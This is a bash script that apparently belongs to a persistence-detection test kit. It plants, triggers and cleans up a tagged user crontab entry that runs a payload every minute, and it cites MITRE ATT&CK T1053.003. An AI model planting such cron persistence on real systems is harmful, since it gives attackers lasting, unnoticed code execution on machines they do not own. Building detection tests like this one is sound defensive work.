#!/usr/bin/env bash
# Implant 1 — Cron job.
# Persistence: a user crontab entry that runs our payload every minute.
# MITRE ATT&CK: T1053.003 (Scheduled Task/Job: Cron).
PD_TECH="cron"
source "$(dirname "$(readlink -f "$0")")/lib.sh"

CRON_FILE="/var/spool/cron/crontabs/$(id -un)"   # path a detector watches

do_paths() { echo "$CRON_FILE"; }

do_plant() {
  local line
  line="* * * * * $(pd_payload_cmd)  # ${PD_TAG} ${PD_TECH}"
  # Append our line, keeping any existing crontab.
  { crontab -l 2>/dev/null | grep -v "${PD_TAG} ${PD_TECH}\$" || true; echo "$line"; } | crontab -
  pd_info "planted: runs every minute"
}

do_cleanup() {
  if crontab -l >/dev/null 2>&1; then
    crontab -l 2>/dev/null | grep -v "${PD_TAG} ${PD_TECH}\$" | crontab - || true
  fi
  pd_info "cleaned up"
}

# Cron's natural trigger takes up to 60s; run the payload directly for a quick
# smoke test instead. Use `verify` after ~70s to confirm the schedule fired.
do_trigger() { pd_trigger_default; }

pd_main "$@"
